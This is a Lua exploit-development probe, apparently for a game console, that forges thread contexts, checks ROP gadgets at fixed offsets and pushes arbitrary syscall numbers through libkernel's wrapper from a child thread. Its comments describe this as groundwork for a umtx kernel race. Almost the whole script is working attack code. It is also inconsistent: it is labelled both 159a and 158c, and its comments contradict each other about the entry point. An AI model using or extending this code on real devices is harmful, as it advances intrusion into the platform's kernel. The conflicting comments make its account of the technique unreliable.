-- CRASH_CLASS: HIGH (a child thread executes a stack-built ROP chain)
-- PROBE 159a: same address, same RAX, main thread vs child thread
--
-- 158b left a contradiction. A thread with RAX = 432 (thr_self) and RDI = buf
-- wrote gettimeofday's seconds into buf, so the call through syscall_address
-- looked like 116 every time. But make_syscall(20) returns a real pid through
-- that same address on the main thread, and thr_create genuinely copies RAX
-- (158a stored 0x1234 from the context).
--
-- This probe asks the same question three ways in one run, with no nanosleep
-- and therefore no way to park the Lua thread:
--
--   A  make_syscall(20)                      -> pid?
--   B  make_syscall(116)                     -> timeval?
--   C  fcall(syscall_address, 432)(buf)      -> TID or timeval?
--   D  fcall(syscall_address, 20)            -> pid?
--   E  a thread with RAX = 432, RDI = buf    -> TID or timeval?
--
-- NOTE: 158a-158c entered at `wrapper`, which is `syscall_address - 7`, i.e. at
-- the `mov rax, 116` itself. That is why every thread call came back as
-- gettimeofday: the number was overwritten by the prologue before the syscall.
-- E here enters at `syscall_address`, past that mov.
--
-- C is the decisive row: it goes through the loader's own fcall, the path that
-- make_syscall uses, with a number the kernel answers visibly (thr_self writes
-- a thread id). If C writes a timeval, the address really is gettimeofday-only.
-- If C writes a TID, the main thread and the child differ and E isolates how.
--
-- 157a proved a thr_create(430) child can run libkernel's syscall wrapper in a
-- loop, but that wrapper has `mov rax, 116` in front of it, so the thread can
-- only ever call gettimeofday. The interesting syscalls (454 umtx, 560 kevent,
-- 97 socket) need their own number in RAX.
--
-- eboot has no `syscall` instruction (157a scanned 1 MB for 0F 05 C3), but
-- libkernel does, inside the same wrapper: `mov rax, 116; mov r10, rcx;
-- syscall; ret`. The `syscall; ret` tail can be entered directly.
--
-- libkernel .text cannot be read to find that tail, so the wrapper is entered
-- at syscall.syscall_address (past the `mov rax, 116`) with RAX supplied by the
-- thread context:
--
--   RIP = syscall_address   (mov r10, rcx; syscall; ret)
--   RAX = 20 (getpid), RDI = marker page, RSP -> [mov [rdi], rax; ret][jmp $]
--
-- A non-zero marker equal to the process pid proves three things at once: the
-- child executes, an arbitrary syscall number reaches the kernel, and the
-- return value comes back to us.
--
-- This is the step that turns 157a's curiosity into the tool the umtx race
-- needs: swap 20 for 454 and the marker page for a umtx word, and the thread is
-- inside a blocking syscall while the main thread acts.

print("=== PROBE 158c: WHICH SYSCALL NUMBER DOES THE THREAD ACTUALLY RUN? ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

local sc_getpid = make_syscall(20)
local sc_thr_self = make_syscall(432)
local sc_thr_create = make_syscall(430)
local sc_thr_kill = make_syscall(433)
local sc_nanosleep = make_syscall(240)
local sc_mmap = make_syscall(477)

local C_MAGIC, C_FLAGS, C_TYPE = 0x108, 0x0D0, 0x110
local C_CS, C_RIP, C_RSP, C_SS = 0x0C0, 0x0E0, 0x0F8, 0x100
local C_RDI, C_RAX = 0x048, 0x078

---------------------------------------------------------------------------
-- [0] identity, eboot base, and the libkernel wrapper
---------------------------------------------------------------------------
local ok0, pid0 = pcall(function() return sc_getpid():tonumber() end)
print("[0] canary pid=" .. tostring(pid0))

local tid_buf = memory.alloc(8)
zero(tid_buf, 8)
pcall(function() sc_thr_self(uint64(tid_buf)) end)
local main_tid = rq(tid_buf)
print("[0] main TID=" .. q(main_tid))

local info = memory.alloc(0x200)
zero(info, 0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local text_lo = rd(info + 0x108)
local text_hi = rd(info + 0x10C)
if not text_lo then
    print("[0] module query returned nothing; aborting")
    return
end
local eboot_base = uint64(string.format("0x%X%08X", text_hi or 0, text_lo or 0))
print("[0] eboot text base=" .. q(eboot_base))

local SW = syscall.syscall_address
if SW == nil then
    print("[0] syscall.syscall_address is nil; the loader did not expose the wrapper")
    return
end
local sw_hi, sw_lo = get_hi_lo(SW)
local wrapper = uint64(string.format("0x%X%08X", sw_hi, sw_lo - 7))
print("[0] syscall_address=" .. q(SW) .. " wrapper=" .. q(wrapper))

-- libkernel .text is execute-only: reading even one byte of it kills the
-- process (this probe's first run died at the line below before it could print
-- a byte). So the wrapper is used, not inspected: syscall.syscall_address
-- already points past the `mov rax, 116`, at `mov r10, rcx; syscall; ret`, and
-- RAX comes from the thread context instead of from the wrapper.
local SysretKnown = false

---------------------------------------------------------------------------
-- [1] the two eboot gadgets, verified by byte before use
---------------------------------------------------------------------------
-- Known from 156d on this firmware; verified before use so a different build
-- cannot silently mis-execute.
local store = eboot_base + 0x92C67
local jmp_self = eboot_base + 0x15481
local function check4(a, b0, b1, b2, b3)
    return rb(a) == b0 and rb(a + 1) == b1 and rb(a + 2) == b2 and rb(a + 3) == b3
end
if not check4(store, 0x48, 0x89, 0x07, 0xC3) then
    print("[1] store gadget mismatch at " .. q(store) .. "; aborting")
    return
end
if not (rb(jmp_self) == 0xEB and rb(jmp_self + 1) == 0xFE) then
    print("[1] jmp $ mismatch at " .. q(jmp_self) .. "; aborting")
    return
end
print("[1] store=" .. q(store) .. " jmp $=" .. q(jmp_self))

---------------------------------------------------------------------------
-- [2] A-D: the loader's own path, on the main thread
---------------------------------------------------------------------------
local function page(n)
    local p = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    for off = 0, (n or 0x38), 8 do wq(p + off, uint64(0)) end
    return p
end

local tv = page(0x18)
local tids = page(0x18)

local ok_a, rv_a = pcall(function() return sc_getpid():tonumber() end)
print("[2] A make_syscall(20)      -> ok=" .. tostring(ok_a) .. " rv=" .. tostring(rv_a))

local ok_b, rv_b = pcall(function() return make_syscall(116)(uint64(tv)):tonumber() end)
print("[2] B make_syscall(116)     -> ok=" .. tostring(ok_b) .. " rv=" .. tostring(rv_b) ..
    " sec=" .. q(rq(tv)))

if type(fcall) ~= "function" or syscall.syscall_address == nil then
    print("[2] fcall or syscall_address missing; stopping after the make_syscall rows")
else
    local ok_c, rv_c = pcall(function()
        return fcall(syscall.syscall_address, 432)(uint64(tids))
    end)
    local seen = rq(tids)
    print("[2] C fcall(addr,432)(buf) -> ok=" .. tostring(ok_c) ..
        " rv=" .. q(rv_c) .. " buf=" .. q(seen))

    local ok_d, rv_d = pcall(function()
        return fcall(syscall.syscall_address, 20)()
    end)
    print("[2] D fcall(addr,20)       -> ok=" .. tostring(ok_d) .. " rv=" .. q(rv_d))
end

---------------------------------------------------------------------------
-- [3] E: the same 432 through a child thread, no sleep, busyloop instead
---------------------------------------------------------------------------
local child_buf = page(0x18)
wq(child_buf, uint64(0xAAAA))

local function spawn(rip, rax, rdi, rsp)
    local ctx = sc_mmap(uint64(0), uint64(0x1000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    zero(ctx, 0x500)
    wq(ctx + C_MAGIC, uint64(0x480))
    wd(ctx + C_FLAGS, 0)
    wd(ctx + C_TYPE, 0x10000)
    wd(ctx + C_CS, 0x43)
    wq(ctx + C_RIP, rip)
    wq(ctx + C_RSP, rsp)
    wd(ctx + C_SS, 0x3B)
    wq(ctx + C_RAX, rax)
    wq(ctx + C_RDI, rdi)
    local id_buf = memory.alloc(8)
    zero(id_buf, 8)
    local ok, rv = pcall(function() return sc_thr_create(uint64(ctx), uint64(id_buf)) end)
    return rq(id_buf), ok, rv
end

local stack = page(0x38)
wq(stack, jmp_self)

local tid_e, ok_e, rv_e = spawn(syscall.syscall_address, uint64(432), child_buf, stack)
print("[3] E thr_create: ok=" .. tostring(ok_e) .. " rv=" .. tostring(to_num(rv_e)) .. " tid=" .. q(tid_e))

-- Busyloop: a few million Lua iterations instead of a sleeping syscall.
local x = 0
for i = 1, 4000000 do x = x + i end
local seen = rq(child_buf)
print("[3] E buf=" .. q(seen) .. " (0xAAAA = untouched)")

pcall(function() sc_thr_kill(tid_e, uint64(0)) end)
local ok5, pid1 = pcall(function() return sc_getpid():tonumber() end)
print("[3] canary after: ok=" .. tostring(ok5) .. " pid=" .. tostring(pid1))

print("")
print("=== PROBE 159a DONE ===")
